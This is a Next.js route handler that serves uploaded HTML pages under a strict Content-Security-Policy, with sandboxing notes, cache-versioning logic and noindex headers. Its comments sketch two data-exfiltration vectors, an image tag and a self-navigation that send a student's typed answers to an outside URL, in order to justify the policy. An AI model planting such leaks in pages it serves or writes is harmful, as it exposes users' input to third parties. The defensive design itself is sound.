import { NextResponse } from "next/server";
import { getPageBySlug } from "@/lib/pages";
import { readPageKind } from "@/lib/page-kind";
import { pageVersion } from "@/lib/page-version";
import { withPrintableBootstrap } from "@/lib/printable-bootstrap";

// The iframe sandbox is the primary control; this is the second layer. Every
// directive here is deliberately restricted to what the document carries
// inside itself — no https: anywhere — because a subresource load is a real
// network request and `img-src https:` alone would let a hostile page
// exfiltrate whatever a student typed via `<img src="https://…?d=answer">`.
// `connect-src 'none'` closes fetch/XHR/beacon but NOT subresource loads,
// which is why the passive directives have to be closed too.
//
// Residual, accepted and unclosable: a sandboxed frame may navigate itself,
// so `location.href = "https://…?d=…"` still leaks. No CSP directive
// prevents it (`navigate-to` was never shipped). The sandbox does block
// navigating the TOP window and opening popups.
//
// Consequence: a page that pulls a font, image, stylesheet or script from a
// CDN will not load it. Self-contained files are the only supported kind.
const CONTENT_SECURITY_POLICY = [
  "default-src 'none'",
  "script-src 'unsafe-inline' 'unsafe-eval' blob:",
  "style-src 'unsafe-inline'",
  "img-src data: blob:",
  "font-src data:",
  "media-src data: blob:",
  "connect-src 'none'",
  "frame-ancestors 'self'",
  "form-action 'none'",
  "base-uri 'none'",
].join("; ");

// A preview frame asks for ?v=<the row's own token>, and only an exact match is
// answered with a cacheable response. Accepting any ?v= would let a stale
// bookmarked token pin a browser to a document that no longer exists, for a
// year — the one failure mode of this scheme, and the reason the token is
// recomputed here rather than trusted.
//
// `private` keeps it out of shared caches. The cost, accepted knowingly: a
// versioned response is written to the browser's disk cache, which the blanket
// no-store used to prevent.
const IMMUTABLE = "private, max-age=31536000, immutable";

export async function GET(
  request: Request,
  { params }: { params: Promise<{ slug: string }> },
) {
  const { slug } = await params;
  const page = await getPageBySlug(slug);
  // A link row has no document to serve, and a pdf row's bytes belong to
  // /p/[slug]/pdf under headers of their own. /p/ means a page we host.
  if (!page || readPageKind(page) !== "html" || page.html === null) {
    return new NextResponse("Not found", { status: 404 });
  }

  // Gated, and the gate is the point. The shell frames this route WITH the
  // parameter so a student can print; the admin's <a download> and every
  // HtmlPreview thumbnail hit it WITHOUT, and get Jenn's bytes exactly as she
  // uploaded them. Injecting unconditionally would put our script into the file
  // she downloads to edit, and the next upload would carry it back in.
  const printable = new URL(request.url).searchParams.get("printable") === "1";
  const body = printable ? withPrintableBootstrap(page.html) : page.html;

  const asked = new URL(request.url).searchParams.get("v");
  const current = pageVersion(page.updatedAt);
  const cacheable = current !== "" && asked === current;

  return new NextResponse(body, {
    headers: {
      "Content-Type": "text/html; charset=utf-8",
      "Content-Security-Policy": CONTENT_SECURITY_POLICY,
      "X-Content-Type-Options": "nosniff",
      "Cache-Control": cacheable ? IMMUTABLE : "no-store",
      // Students may publish here now. Nothing on this route should ever reach
      // an index, and the framing page carries the same instruction in its
      // metadata.
      "X-Robots-Tag": "noindex, nofollow",
    },
  });
}
